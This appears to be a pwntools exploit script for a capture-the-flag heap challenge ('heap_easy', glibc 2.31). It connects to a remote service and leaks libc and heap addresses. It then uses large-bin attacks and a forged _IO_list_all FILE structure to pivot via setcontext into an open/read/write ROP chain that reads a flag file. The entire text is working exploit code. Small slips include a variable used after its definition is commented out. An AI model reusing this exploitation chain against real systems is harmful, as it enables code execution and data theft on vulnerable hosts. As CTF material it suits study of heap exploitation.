from operator import mod
import sys
import telnetlib
from pip import main
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
libc = ELF("writeup/libc-2.31.so")
#file = 'dist/heap_easy'
elf = ELF(file)
#io = process(['./ld-2.31.so', file], env={"LD_PRELOAD":'./libc-2.31.so'})
#io=process(file)
io=remote("34.92.63.126",59010)
ra = lambda : io.recv()
ru = lambda x: io.recvuntil(x)
sd = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda x, y: io.sendafter(x, y)
sla = lambda x, y: io.sendlineafter(x, y)
li = lambda name,x : log.info(name+':'+hex(x))
shell = lambda : io.interactive()

def cmd(choice):
    sla("You choice:\n",str(choice))

def build(idx,size,content):
    cmd(1)
    sla("Please input the idx:\n",str(idx))
    sla("Please input the size:\n",str(size))
    sa("Please input the content:\n",content)

def display(idx):
    cmd(4)
    sla("Please input the idx:\n",str(idx))

def modify(idx,content):
    cmd(3)
    sla("Please input the idx:\n",str(idx))
    sd(content)

def destory(idx):
    cmd(2)
    sla("Please input the idx:\n",str(idx))


build(0,0x410,'aaaa')
build(1,0x420,'aaaa')
destory(0)
build(2,0x420,'aaaa')
build(0,0x410,'a'*8)
display(0)
ru('a'*8)
main_arena = u64(io.recv(6).ljust(8,'\x00')) - 1104
malloc_hook = main_arena-0x10
libcbase = malloc_hook-libc.sym["__malloc_hook"]
log.success("libcbase->"+hex(libcbase))
modify(0,'a'*0x10)
display(0)
ru("a"*0x10)
heap_addr = u64(io.recv(6).ljust(8,'\x00'))
log.success("heap_addr->"+hex(heap_addr))

pop_rdi = libcbase+0x0000000000026b72
pop_rsi = libcbase+0x0000000000027529
pop_rdx_r12 = libcbase+0x000000000011c1e1
free_hook = libcbase+libc.sym["__free_hook"]
Open = libcbase + libc.symbols["open"]
Read = libcbase + libc.symbols["read"]
Write = libcbase + libc.symbols['write']
gadget = libcbase + 0x00000000001547a0#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
syscall = libcbase + libc.search(asm("syscall\nret")).next()
target_addr = libcbase + libc.sym["_IO_list_all"]
magic_gadget = libcbase +libc.sym["setcontext"]+61
_IO_wfile_jumps = libcbase + libc.sym["_IO_wfile_jumps"]


build(0,0x428,'aaaa')
build(1,0x418,'aaaa')
build(2,0x418,'aaaa')
build(3,0x418,'./flag.txt\x00')#flag
destory(0)
build(4,0x438,'aaaa')#orw
destory(2)

fake_io = flat({
    #0x0: ~(2|0x8|0x800),#67
    0x10: 0,
    0x18: 0xffff,
    0x90: heap_addr+5328+0x30+0xc0,
    0xb0: 0,
    0xc8: _IO_wfile_jumps
})

data = flat({
    0: {
        0: bytes(fake_io),
        0xe0: {
            0x18: 0,
            0x30: 0,
            0xe0: heap_addr+5328+0x30+0x1d0
        },
        0x1f0: {
            0x68: gadget
        }
    }
})

modify(0,p64(main_arena+1104)*2+p64(target_addr - 0x20)*2)
modify(1,'a'*0x410+p64(libcbase+8528+0x10))
build(5,0x438,'aaaa')
modify(2,data)
orw = p64(pop_rdi) + p64(heap_addr+6384+0x10) + p64(pop_rsi) + p64(0)
orw += p64(Open)
orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap_addr) + p64(pop_rdx_r12) + p64(0x200) + p64(0)
orw += p64(Read)
orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap_addr) + p64(pop_rdx_r12) + p64(0x200) + p64(0)
orw += p64(Write)
modify(4,orw)
#modify(5,p64(libcbase+8528+0x10)+p64(0)*3+p64(magic_gadget)+'a'*0x78+p64(heap_addr+0x7440+0x10))

build(6,0x458,'aaaa')
build(7,0x448,'aaaa')
build(8,0x448,'aaaa')
build(9,0x448,'aaaa')
destory(6)
build(10,0x468,'aaaa')
modify(6,p64(main_arena+1120)*2+p64(heap_addr+9616)+p64(heap_addr+5336-0x20))
destory(8)
build(11,0x468,'aaaa')
modify(8,p64(0)*2+p64(magic_gadget)+'a'*0x78+p64(heap_addr+7440+0x18)+p64(pop_rdi))
#gdb.attach(io)
ra()
#
sl("5")

#
shell()
